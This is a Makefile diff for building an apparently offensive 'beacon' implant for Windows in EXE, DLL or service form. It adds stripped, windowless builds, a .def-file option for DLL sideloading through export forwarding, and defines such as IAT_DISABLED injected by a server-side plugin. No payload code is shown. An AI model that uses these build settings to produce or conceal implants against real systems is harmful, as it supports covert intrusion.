@@ -34,14 +34,20 @@ endif
 FORMAT   ?= exe
 
 # Common flags (modeled on beacon_agent)
-CXXFLAGS := -fno-stack-protector -fno-strict-overflow \
+CXXFLAGS := -std=c++17 -Os -fno-stack-protector -fno-strict-overflow \
             -fno-delete-null-pointer-checks -fno-strict-aliasing \
             -fno-builtin -fno-exceptions -fno-unwind-tables \
-            -fno-asynchronous-unwind-tables -fpermissive -Wall -Wextra \
-            -masm=intel -fPIC -I $(SRC_DIR)/impl -I $(SRC_DIR)/protocol -I $(SRC_DIR)/crypto
+            -fno-asynchronous-unwind-tables -fpermissive -w \
+            -masm=intel -fPIC -I $(SRC_DIR) -I $(SRC_DIR)/impl -I $(SRC_DIR)/protocol -I $(SRC_DIR)/crypto
 
-LDFLAGS  :=
+LDFLAGS  := -s -Wl,-s,--gc-sections -static-libgcc -mwindows
 DEFINES  :=
+
+# Sideloading: path to .def file for export forwarding (set by plugin)
+DEFFILE  ?=
+
+# Extra defines injected by server-side plugin (e.g. -DDEBUG -DIAT_DISABLED)
+EXTRA_DEFINES ?=
 
 # Profile header (injected by server-side plugin at build time)
 PROFILE_HEADER ?=
@@ -52,6 +58,9 @@ endif
 ifeq ($(FORMAT),dll)
     DEFINES += -DBUILD_DLL -D_WIN32_WINNT=0x0600
     LDFLAGS += -shared
+    ifneq ($(DEFFILE),)
+        LDFLAGS += $(DEFFILE)
+    endif
     EXT_X64  = _x64.dll
     EXT_X86  = _x86.dll
 else ifeq ($(FORMAT),svc)
@@ -77,12 +86,12 @@ all: $(ALL_TARGETS)
 
 x64:
 	@echo "[*] Building $(BEACON) x64 ($(FORMAT))..."
-	$(CXX_X64) $(CXXFLAGS) $(DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X64) $(SOURCES) -lws2_32 -lwinhttp
+	$(CXX_X64) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X64) $(SOURCES) -lws2_32 -lwinhttp
 	@echo "[+] $(BEACON)$(EXT_X64)"
 
 x86:
 	@echo "[*] Building $(BEACON) x86 ($(FORMAT))..."
-	$(CXX_X86) $(CXXFLAGS) $(DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X86) $(SOURCES) -lws2_32 -lwinhttp
+	$(CXX_X86) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X86) $(SOURCES) -lws2_32 -lwinhttp
 	@echo "[+] $(BEACON)$(EXT_X86)"
 
 clean: ; @$(CLEAN_CMD)
